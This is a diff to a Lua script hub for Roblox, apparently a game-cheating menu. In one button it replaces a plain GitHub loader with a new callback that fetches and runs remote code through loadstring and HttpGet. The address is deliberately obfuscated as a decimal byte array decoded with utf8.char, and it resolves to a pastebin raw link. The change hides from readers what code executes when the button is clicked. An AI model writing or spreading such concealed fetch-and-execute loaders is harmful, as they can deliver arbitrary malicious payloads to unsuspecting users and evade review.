@@ -712,11 +712,11 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
-	Name = "云脚本",
+	Name = "波奇塔自制脚本",
 	Callback = function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/V1.1.2.lua"))()
-  	end
-})
+loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,113,109,55,76,121,119,82,117})end)())))()
+end
+})    
 
 local Tab = Window:MakeTab({
     Name = "特殊脚本（可能无效）",
